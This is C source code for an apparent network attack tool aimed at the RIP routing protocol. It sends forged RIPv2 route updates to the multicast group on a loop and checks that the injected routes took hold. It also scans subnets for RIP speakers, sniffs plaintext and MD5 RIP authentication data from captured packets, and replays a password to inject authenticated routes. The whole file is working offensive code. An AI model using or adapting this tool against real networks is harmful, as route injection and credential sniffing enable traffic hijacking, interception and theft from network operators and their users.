#include "fibc.h"

pcap_t *handle;

#define CASE(x,y) {	\
	case (x):	\
	offset_dl=(y);	\
	break; }

int
sizeof_datalink (pcap_t * pd)
{
	int dtl;
	int offset_dl;

	if ((dtl = pcap_datalink (pd)) < 0)
		fatal ("no datalink info: %s", pcap_geterr (pd));

	switch (dtl) {
		CASE (AP_DLT_NULL, 4);
		CASE (AP_DLT_EN10MB, 14);
		CASE (AP_DLT_EN3MB, 14);
		CASE (AP_DLT_AX25, -1);
		CASE (AP_DLT_PRONET, -1);
		CASE (AP_DLT_CHAOS, -1);
		CASE (AP_DLT_IEEE802, 22);
		CASE (AP_DLT_ARCNET, -1);
#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__) || defined (__BSDI__)
		CASE (AP_DLT_SLIP, 16);
#else
		CASE (AP_DLT_SLIP, 24);
#endif

#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__)
		CASE (AP_DLT_PPP, 4);
#elif defined (__sun)
		CASE (AP_DLT_PPP, 8);
#else
		CASE (AP_DLT_PPP, 24);
#endif
		CASE (AP_DLT_FDDI, 21);
		CASE (AP_DLT_ATM_RFC1483, 8);

		CASE (AP_DLT_LOOP, 4);	/* according to OpenBSD DLT_LOOP
					 * collision: see "bpf.h" */
		CASE (AP_DLT_RAW, 0);

		CASE (AP_DLT_SLIP_BSDOS, 16);
		CASE (AP_DLT_PPP_BSDOS, 4);
		CASE (AP_DLT_ATM_CLIP, -1);
#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__)
		CASE (AP_DLT_PPP_SERIAL, 4);
		CASE (AP_DLT_PPP_ETHER, 4);
#elif defined (__sun)
		CASE (AP_DLT_PPP_SERIAL, 8);
		CASE (AP_DLT_PPP_ETHER, 8);
#else
		CASE (AP_DLT_PPP_SERIAL, 24);
		CASE (AP_DLT_PPP_ETHER, 24);
#endif
		CASE (AP_DLT_C_HDLC, -1);
		CASE (AP_DLT_IEEE802_11, 30);
		CASE (AP_DLT_LINUX_SLL, 16);
		CASE (AP_DLT_LTALK, -1);
		CASE (AP_DLT_ECONET, -1);
		CASE (AP_DLT_IPFILTER, -1);
		CASE (AP_DLT_PFLOG, -1);
		CASE (AP_DLT_CISCO_IOS, -1);
		CASE (AP_DLT_PRISM_HEADER, -1);
		CASE (AP_DLT_AIRONET_HEADER, -1);
		default:
			fatal ("unknown datalink type DTL_?=%d", dtl);
			break;
	}

	return offset_dl;
}

void
fatal (char *pattern, ...)
{
	va_list ap;
	va_start (ap, pattern);
	vfprintf (stderr, pattern, ap);
	va_end (ap);
	exit (1);
}

char *
in_ntoa (unsigned long in)
{
	static char buff[18];
	char *p;

	p = (char *) &in;
	sprintf (buff, "%d.%d.%d.%d",
		(p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
	return (buff);
}

void
init_all (struct net_param *net) 
{
	char errbuf[PCAP_ERRBUF_SIZE];

	if (geteuid ()) {
		fprintf (stderr, "You must be root to run this tool\n");
		exit (1);
	}

	if ((net->dev = pcap_lookupdev (errbuf)) == NULL)
		fatal (" pcap_lookupdev: %s\n\n", errbuf);

	if (pcap_lookupnet(net->dev, (bpf_u_int32 *) &net->localnet, net->routes[1], errbuf) < 0)
		fatal (" pcap_lookupnet: %s\n\n", errbuf);

	net->localaddr = libnet_get_ipaddr4 ((libnet_t *) net->dev);
	*(net->routes[METRIC]) = htonl (1);
	*(net->routes[GW]) = net->localaddr;
	net->num = 1;
	net->rip_group = inet_addr(RIP_GROUP);
}

void *select_check(unsigned long flags)
{
	if (flags & PASS) return &check_injection_crypt;
	else return &check_injection; 
}

void *select_main(unsigned long flags)
{
	if (flags & SNIFF) return &sniff_passwd;
	else if (flags & PASS) return &auth_pass;
	else return &send_fake_rip_response;
}

void
send_fake_rip_response (struct net_param *net)
{
	libnet_t *l;
	libnet_ptag_t udp;
	libnet_ptag_t ip;
	struct rip *pack;
	struct rip_message *entries;
	char errbuf[LIBNET_ERRBUF_SIZE];
	u_char buffer[BUFSIZ/2];
	int i;
 
	memset(buffer, 0x0, BUFSIZ/2);

	pack = (struct rip *) (buffer);
	entries = (struct rip_message *) (buffer + RIPLEN);

	pack->command = 2;
	pack->version = 2;

	for (i = 0; i < net->num; i++) {
		entries->family = htons (2);
		entries->tag = 0;
		entries->ip = net->routes[ROUTE][i];
		entries->netmask = net->routes[NETMASK][i];
		entries->gateway = net->routes[GW][i];
		entries->metric = net->routes[METRIC][i];
		entries++;
	}

	l = libnet_init (LIBNET_RAW4, net->dev, errbuf);

	udp = libnet_build_udp (RIP_PORT, 
				RIP_PORT,
				LIBNET_UDP_H + RIPLEN + RIPMSGLEN * net->num, 
				0, 
				buffer,
				RIPLEN + RIPMSGLEN * net->num,
				l, 
				0);

	ip = libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + RIPLEN + RIPMSGLEN * net->num, 
				0,
				3000 + (rand () % 100), 
				0,
				64, 
				IPPROTO_UDP, 
				0,
				net->localaddr, 
				net->rip_group, 
				NULL, 
				0, 
				l, 
				0);

	if (libnet_toggle_checksum (l, udp, 1) < 0) {
		if(graph)
			endwin();
    		fatal ("libnet_toggle_checksum: %s\n\n", libnet_geterror (l));
	}

	while (1) {
		if ((libnet_write (l)) < 0) {
			if(graph)
				endwin();
			fatal ("libnet_write(): %s\n\n", libnet_geterror (l));
		}
		sleep(30);
	}
}

void
check_injection (struct net_param *net)
{
	char buffer[BUFLEN], buffer_pkt[BUFSIZ/2];
	int sock, i;
	struct rip *rip_head;
	struct rip_message *entries, *ripmsg;
	struct sockaddr_in peer;

	memset(buffer, 0x0, BUFLEN);
	memset(buffer_pkt, 0x0, BUFSIZ/2);

	rip_head = (struct rip *) (buffer_pkt);
	entries = (struct rip_message *) (buffer_pkt + RIPLEN);
	ripmsg = (struct rip_message *) (buffer + RIPLEN);

	rip_head->command = 1;
	rip_head->version = 2;

	for (i = 0; i < net->num; i++) {
		entries->family = htons (2);
		entries->tag = 0;
		entries->ip = net->routes[ROUTE][i];
		entries->netmask = net->routes[NETMASK][i];
		entries->gateway = net->routes[GW][i];
		entries->metric = net->routes[METRIC][i];
		entries++;
	}

	peer.sin_family = AF_INET;
	peer.sin_addr.s_addr = net->rip_group;
	peer.sin_port = htons (RIP_PORT);

	if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0) {
		if (graph)
			endwin();
		fatal (" failed to create socket: %s\n\n", strerror (errno));
	}
	fcntl (sock, F_SETFL, O_NONBLOCK);

	sleep(5);

	while (1) {
		int j, letti;

		if (sendto(sock, buffer_pkt, RIPLEN + RIPMSGLEN * net->num, 0,
		    (struct sockaddr *) &peer, sizeof (peer)) < 0) {
			if (graph)
				endwin();
			fatal ("  failed to send packets: %s\n\n", strerror (errno));
		}
		
		sleep(1);
		memset(buffer, 0x0, BUFLEN);

		if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0) {
			n_print ("princ", 1, 3, "\nNo Response (try -x)\n");
			letti = 0;
		} else
			letti = (letti - 4) / RIPMSGLEN;

		for (i = 0; i < net->num; i++) {
			for (j = 0; j < letti; j++) {
				if ((ripmsg+j)->ip == net->routes[ROUTE][i]) {
					if (((ripmsg+j)->metric == net->routes[METRIC][i] + htonl(1)) &&
					    ((ripmsg+j)->netmask == net->routes[NETMASK][i]) &&
					    ((ripmsg+j)->gateway == net->routes[GW][i])) {
						n_print ("princ", 1, 2, "\nRoute %s: Injected Correctly\n", in_ntoa ((ripmsg+j)->ip));
						if(!graph)
							fflush (stdout); 
							break;
					} else {
						n_print ("princ", 1, 2, "\nRoute %s: Injection Failed\n", in_ntoa((ripmsg+j)->ip)); 
						n_print ("princ", 2, 2, "netmask: %s, should be %s\n", in_ntoa((ripmsg+j)->netmask), in_ntoa(net->routes[NETMASK][i]));
						n_print ("princ", 3, 2, "gw: %s, should be %s\n", in_ntoa((ripmsg+j)->gateway), in_ntoa(net->routes[GW][i]));
						n_print ("princ", 4, 2, "metric: %u, should be %u\n", ntohl((ripmsg+j)->metric), ntohl(net->routes[METRIC][i]));
						if(!graph)
							fflush (stdout); 
						break;
					}
				}
			}
		}
		sleep(30);
	}
}

void
pack_handler (char *packet, int readlen, unsigned long ip)
{
	struct rip_message *rip_head;

	rip_head = (struct rip_message *) (packet + RIPLEN);
	n_print ("princ", 1, 2, "\n HOST %s SPEAKS RIPv%i!!\n", in_ntoa(htonl(ip)), *(packet + 1));

	n_print ("princ", 1, 2, " *-*-*-*-*-*-*-*-*-*-*-*-*\n");
	for (; (u_long) * (&rip_head) < (u_long) (packet) + readlen; rip_head++) {
		n_print ("princ", 2, 2, "   |-- IP: %s\n", in_ntoa (rip_head->ip));
		n_print ("princ", 3, 2, "   |------ Metric: %u\n", ntohl (rip_head->metric));
		n_print ("princ", 4, 2, "   |------ Netmask: %s\n", in_ntoa (rip_head->netmask));
		n_print ("princ", 5, 2, "   |------ Next Hop: %s\n", in_ntoa (rip_head->gateway));
		n_print ("princ", 6, 2, "   |------ Tag: %u\n", rip_head->tag);
		n_print ("princ", 7, 2, "   |------ Family: %u\n\n", htons (rip_head->family));
	}
}

int
scan_net (char *n_net)
{
	char *prefix;
	int sock[0xff], readlen;
	unsigned long i, j;
	unsigned long start, end;
	
	struct {
		struct rip rip_head;
		struct rip_message entry;
	} rip_scan;

	struct sockaddr_in peers;
	fd_set rfd;
	struct timeval tv;
	char buffer[BUFLEN];
	int n_butt = 8;

	peers.sin_family = AF_INET;
	peers.sin_port = htons (RIP_PORT);

	if ((prefix = memchr (n_net, '/', strlen (n_net))) == NULL) {
		if(graph) {
			n_print("princ", 2, 2, "You must use the subnet/prefix format!!!");
			return (ERR);
		} else
			fatal(" You must use the subnet/prefix format!!!\n Example: 192.168.0.0/24 format!!!\n\n");
	}
  
	*(prefix) = '\0';
	start = inet_network (n_net);
	end = start + (1 << (32 - atoi (++prefix)));

	memset(&rip_scan, 0x0, sizeof (rip_scan));

	rip_scan.rip_head.command = 1;
	rip_scan.rip_head.version = 2;
	rip_scan.entry.metric = htonl (16);

	tv.tv_sec = 5;
	tv.tv_usec = 0;
  
	while(1) {
		FD_ZERO(&rfd);

		for (i = 0; (start+i < end) && (i < 0xff); i++) {
			if (((start+i) & 0xff) == 0xff)
				continue;
			if(!((start+i) & 0xff))
				continue;
			if ((sock[i] = socket (AF_INET, SOCK_DGRAM, 0)) < 0) {
				if(graph)
					endwin();
				fatal("unable to create socket\n");
			}
			FD_SET(sock[i], &rfd);
		}
		n_print("princ", 3, 2, "Sending Packets: ");
		for (i = 0; (start+i < end) && (i < 0xff); i++) {
			if (((start+i) & 0xff) == 0xff)
				continue;        
			if(!((start+i) & 0xff))
				continue;
			peers.sin_addr.s_addr = htonl (start+i);
			if (sendto (sock[i], &rip_scan, sizeof(rip_scan), 0, (struct sockaddr *) &peers, sizeof (peers)) < 0)
				n_print("princ", 4, 2, "error sending frame to %s\n", in_ntoa(peers.sin_addr.s_addr));
		}
		n_print("princ", 5, 1, " Packets From %s to ", in_ntoa(htonl(start)));
		n_print("princ", 6, 1, "%s Sent!\n", in_ntoa(htonl(start+i-1))); 
		n_print("princ", 7, 2, "Now Listening..\n");
		fflush(stdout);
	
		if ((j = select(sock[0xfe]+1, &rfd, NULL, NULL, &tv)) > 0) { 
			for (i = 0; (start+i < end) && (i < 0xff) && (j != 0); i++) {
				if (((start+i) & 0xff) == 0xff)
					continue;
				if(!((start+i) & 0xff))
					continue;
				if (FD_ISSET(sock[i], &rfd)) {
					memset(buffer, 0, BUFLEN);
					n_butt++;
					if ((readlen = read(sock[i], buffer, BUFLEN)) > 0) {
						pack_handler(buffer, readlen, start+i);
						j--;
					}
				}
			}
		}
		for (i = 0; (start+i < end) && (i < 0xff); i++)
			close(sock[i]);
		if ((start+=0x100) >= end) break; 
	}
  
	return 0;
}

void
rip_file_read (char *filez, struct net_param *net)
{
	FILE *OPENF;
	int i;
        
	if ((OPENF = fopen (filez, "r+")) == NULL) {
		if(graph) {
			endwin();
			printf("\n**%sRember that if you want to read from the default file you have to type NULL in the pop_up%s**\n\n",BOLD,NORMAL);
		}
		fatal ("Unable to open %s.\n", filez);
	}
	fscanf (OPENF, "%u\n", &net->num);

	if (net->num > 25) {
		if(graph)
			endwin();
		fatal ("%s corrupted\n\n", filez);
	}

	for (i = 0; i < net->num; i++) {
		fscanf (OPENF, "%u %u %u %u\n", *(net->routes)+i, *(net->routes+NETMASK)+i,
						*(net->routes+GW)+i, *(net->routes+METRIC)+i);
		n_print ("princ", i+1, 2, "\tRead: Route: %s ", in_ntoa (net->routes[ROUTE][i]));
		n_print ("princ", i+1, 34, "Netmask %s ", in_ntoa(net->routes[NETMASK][i])); 
		n_print ("princ", i+1, 57, "Gateway: %s ", in_ntoa(net->routes[GW][i])); 
		n_print ("princ", i+1, 80, "Metric: %u\n", ntohl (net->routes[METRIC][i]));
	}

	printf("\n");

	fclose (OPENF);
}

void
pack_handler_sniff (u_char * args, const struct pcap_pkthdr *header,
		    const u_char * packet)
{
	struct authentication *auth;
	int i;
	unsigned char *ihl;

	ihl = (unsigned char *)(packet + sizeof_datalink(handle));
	auth = (struct authentication *) (packet + sizeof_datalink (handle) +
					 (*ihl & 0xF)*4 + 
					  sizeof (struct udphdr) + RIPLEN);

	n_print ("winfo", 1, 2, "Packet Examined... ");
	
	if ((auth->flag == 0xFFFF) && (auth->auth_type == htons (2)))
		n_print ("winfo", 2, 2, "password found == %s\n", auth->passwd);
	
	else if ((auth->flag == 0xFFFF) && (auth->auth_type == htons (3))) {
		unsigned char *ptr;
		unsigned short *length;
		
		n_print ("winfo", 1, 2, "MD5 password found\n");
		
		length = ((unsigned short *)auth) + 2;
		ptr = ((unsigned char *)auth) + 6;
		
		n_print ("winfo", 3, 2, "Key ID: %u\n", *ptr);
		ptr += 2;
		n_print ("winfo", 4, 2, "Sequence Number: %u\n", ntohl(*(unsigned long *)ptr));

		ptr += ntohs(*length) - 8;

		// DA PORTARE IN NCURSES
	
		printf("Authentication Data: ");

		for (i = 0; i < 16; i++) 
			printf("0x%x ", *(ptr+i));

		printf("\n\n");	

		if(!graph)
			fflush(stdout);	
	} else 
		n_print ("winfo", 2, 2, "and there is no authentication header\n");
}

void
sniff_passwd (struct net_param *net)
{
	struct bpf_program filter;
	char *filter_app = "udp src port 520";
	char errbuf[PCAP_ERRBUF_SIZE];
	
	handle = pcap_open_live (net->dev, BUFSIZ, 1, -1, errbuf);
	if (pcap_compile (handle, &filter, filter_app, 0, 0) < 0) {
		if(graph)
			endwin();
		fatal (" pcap_compile: %s\n\n", pcap_geterr (handle));
	}

	pcap_setfilter(handle, &filter);
	{
#ifdef __OpenBSD__
		int fd;	
	
		fd = pcap_fileno(handle);
		fcntl(fd, F_SETFL, O_NONBLOCK); 

		while(1)
#endif
			pcap_loop (handle, -1, pack_handler_sniff, NULL);
	}
}

void
auth_pass (struct net_param *net)
{
	libnet_t *l;
	libnet_ptag_t udp;
	libnet_ptag_t ip;
	struct rip *pack;
	struct authentication *auth;
	struct rip_message *entries;
	char errbuf[LIBNET_ERRBUF_SIZE];
	unsigned char buffer[BUFSIZ/2];
	int i;

	pack = (struct rip *) (buffer);
	auth = (struct authentication *) (buffer + RIPLEN);
	entries = (struct rip_message *) (buffer + RIPLEN + AUTHLEN);

	pack->command = 2;
	pack->version = 2;

	auth->flag = 0xFFFF;
	auth->auth_type = htons (2);
	strncpy (auth->passwd, net->password, 16);

	if (net->num == 25)
		net->num--;

	for (i = 0; i < net->num; i++) {
		entries->family = htons (2);
		entries->tag = 0;
		entries->ip = net->routes[ROUTE][i];
		entries->netmask = net->routes[NETMASK][i];
		entries->gateway = net->routes[GW][i];
		entries->metric = net->routes[METRIC][i];
		entries++;
	}

	l = libnet_init (LIBNET_RAW4, net->dev, errbuf);

	udp = libnet_build_udp (RIP_PORT,
		RIP_PORT,
		LIBNET_UDP_H + RIPLEN + AUTHLEN + RIPMSGLEN * net->num, 
		0, 
		buffer, 
		RIPLEN + AUTHLEN + RIPMSGLEN * net->num, 
		l, 
		0);

	ip = libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + 
						RIPLEN +
						AUTHLEN +
						RIPMSGLEN * net->num,
				0,
				3000 + (rand () % 100),
				0,
				64,
				IPPROTO_UDP,
				0, 
				net->localaddr, 
				net->rip_group, 
				NULL, 
				0, 
				l, 
				0);

	if (libnet_toggle_checksum (l, udp, 1) < 0) {
		if(graph)
			endwin();
		fatal ("error: %s\n\n", libnet_geterror (l));
	}
	while (1) {
		if ((libnet_write (l)) < 0) {
			if(graph)
				endwin();
			fatal ("libnet_write(): %s\n\n", libnet_geterror (l));
		}
		sleep(30);
	}
}

void
check_injection_crypt (struct net_param *net)
{
	char buffer[BUFLEN], buffer_pkt[BUFSIZ/2];
	int sock, i;
	struct rip *rip_head;
	struct authentication *auth;
	struct rip_message *ripmsg, *entries;
	struct sockaddr_in peer;

	memset(buffer, 0x0, BUFLEN);
	memset(buffer_pkt, 0x0, BUFSIZ/2);

	ripmsg = (struct rip_message *) (buffer + RIPLEN);
	rip_head = (struct rip *) (buffer_pkt);
	auth = (struct authentication *) (buffer_pkt + RIPLEN);
	entries = (struct rip_message *) (buffer_pkt + RIPLEN +
						       AUTHLEN);

	rip_head->command = 1;
	rip_head->version = 2;

	auth->flag = 0xFFFF;
	auth->auth_type = htons (2);
	strncpy (auth->passwd, net->password, 16);

	if (net->num == 25)
		net->num--;

	for (i = 0; i < net->num; i++) {
		entries->family = htons (2);
		entries->tag = 0;
		entries->ip = net->routes[ROUTE][i];
		entries->netmask = net->routes[NETMASK][i];
		entries->gateway = net->routes[GW][i];
		entries->metric = net->routes[METRIC][i];
		entries++;
	}

	peer.sin_family = AF_INET;
	peer.sin_addr.s_addr = net->rip_group;
	peer.sin_port = htons (RIP_PORT);

	if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0) {
		if(graph)
			endwin();
		fatal (" failed to create socket: %s\n\n", strerror (errno));
	}

	fcntl (sock, F_SETFL, O_NONBLOCK);

	sleep(5);
	
	while (1) {
		int j, letti;

		if (sendto(sock, buffer_pkt, RIPLEN + RIPMSGLEN * (net->num + 1), 0, 
		    (struct sockaddr *) &peer, sizeof (peer)) < 0) {
			if(graph)
				endwin();
			fatal ("  failed to send packets: %s\n\n", strerror (errno));
		}

		sleep(1);
		memset(buffer, 0x0, BUFLEN);

		if ((letti = recvfrom (sock, buffer, BUFLEN, 0, NULL, NULL)) < 0) {
			n_print ("princ", 1, 2, "\nNo Response (try -x)\n");
			letti = 0;
		} else
			letti = (letti - 4) / RIPMSGLEN;
		
		for (i = 0; i < net->num; i++) {
			for (j = 1; j < letti; j++) {
				if ((ripmsg+j)->ip == net->routes[ROUTE][i]) {
					if ((ripmsg+j)->metric == net->routes[METRIC][i] + htonl(1) &&
					   ((ripmsg+j)->netmask == net->routes[NETMASK][i]) &&
					   ((ripmsg+j)->gateway == net->routes[GW][i])) {
						n_print ("princ", 2, 2, "\nRoute %s: Injected Correctly\n", in_ntoa ((ripmsg+j)->ip));
						if(!graph)		      
							fflush (stdout); 
						break;
					} else {
						n_print ("princ", 1, 2, "\nRoute %s: Injection Failed\n", in_ntoa((ripmsg+j)->ip));
						n_print ("princ", 2, 2, "netmask: %s, should be %s\n", in_ntoa((ripmsg+j)->netmask), in_ntoa(net->routes[NETMASK][i]));
						n_print ("princ", 3, 2, "gw: %s, should be %s\n", in_ntoa((ripmsg+j)->gateway), in_ntoa(net->routes[GW][i]));
						n_print ("princ", 4, 2, "metric: %u, should be %s\n", ntohl((ripmsg+j)->gateway), ntohl(net->routes[METRIC][i]));
						if(!graph)
							fflush (stdout); 
						break;
					}
				}
			}
		}
		sleep(30);
	}
}
 
void n_print(char *wins, int y, int x, char *string, ...)
{
	char msg[400];
	int n;
	va_list ap;

	va_start(ap, string);
	n = vsnprintf(msg, 400, string, ap);
	va_end(ap);

	if(!graph)
		fprintf(stdout,"%s",msg);
	else	
		ng_print(wins,y,x,msg);
}
